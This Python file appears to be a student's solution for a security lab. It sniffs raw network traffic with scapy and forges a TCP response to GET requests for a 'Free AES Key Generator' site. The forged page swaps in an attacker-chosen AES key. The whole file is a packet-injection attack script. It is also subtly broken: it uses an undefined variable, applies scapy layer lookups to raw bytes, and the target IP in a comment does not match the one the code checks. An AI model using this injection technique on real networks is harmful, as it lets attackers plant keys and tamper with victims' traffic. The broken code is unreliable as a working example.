from scapy.all import send, conf, L3RawSocket
from scapy.all import TCP,IP,Ether
import socket

# Use this function to send packets
def inject_pkt(pkt):
    conf.L3socket=L3RawSocket
    send(pkt)

###
# edit this function to do your attack
###
def handle_pkt(pkt):
    # to do:
    # - We need to check if there is a request sent to AESfreekey, ip address is 3.87.84.204 from wireshark
    # - we then need to construct a new identical packet and call inject_pkt on it to send the injected packet.
    # - Will construct a "paload" in order to mimick the html of the website adn just replace the AES key with our key.
    # - We don't need to check if the packet came from a specific IP becuase we are running root and every machine on the network should receive the injected packet
    # - Need to investigate scappy to find the function to construct a packet
    # Source of AES.key generator is at pkt[26] - pkt[29]
    # Distincation bits are at pkt[30] - pkt[33]
    # serverIP = str(pkt[30]+ "." + str(pkt[31]) + "." + str(pkt[32]) + "." + str(pkt[33])) # this should take the packet that is in hex and parse out the destination ip address from the get request in the form 1.1.1.1
        
    ip_dst = pkt[IP].dst
    if ip_dst == "3.87.34.204" and pkt.find(b'GET')!=-1:  # I douns this ip address from looking at the get request sent out when I accessed the site. Used wire shark to look at packets 
        src = pkt[IP].src
        srcPort = pkt[TCP].sport
        destPort = pkt[TCP].dport
        ack_num = pkt[TCP].ack
        seq_num = pkt[TCP].seq
        tcpPayload = pkt[TCP].payload
        # tcpPayload[-89:-25] = '4d6167696320576f7264733a2053717565616d697368204f7373696672616765'
        html = '<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>'
        
        InjectedPacket = IP(src=dst, dst=src)/TCP(sport=destPort, dport=srcPort, flags="PA", seq = ack_num, ack=seq_num + len(tcpPayload))/html

         #need to parse together new packet. Still confused how to do that with scappy
         # i know we need seq number, ack number, dest port, dest ip, and then the html, you can get all of those from the request packet and then use a function to parse together a new packet
         # call inject packet 
        inject_pkt(InjectedPacket)
    

def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__=='__main__':
    main()
